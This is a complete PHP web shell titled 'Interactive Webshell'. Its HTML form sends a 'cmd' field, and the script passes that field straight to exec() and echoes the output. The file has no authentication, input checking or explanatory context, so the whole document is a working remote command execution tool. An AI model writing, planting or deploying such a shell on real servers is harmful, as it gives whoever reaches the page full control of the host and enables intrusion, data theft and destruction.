<?php
    if (isset($_POST['cmd'])) {
        $command = $_POST['cmd'];
        $output = '';
        exec($command, $output);
        echo implode("\n", $output);
    }
?>

<!DOCTYPE html>
<html>
<head>
    <title>Interactive Webshell</title>
</head>
<body>
    <form method="POST" action="">
        <input type="text" name="cmd" placeholder="Enter a command">
        <input type="submit" value="Send">
    </form>
</body>
</html>

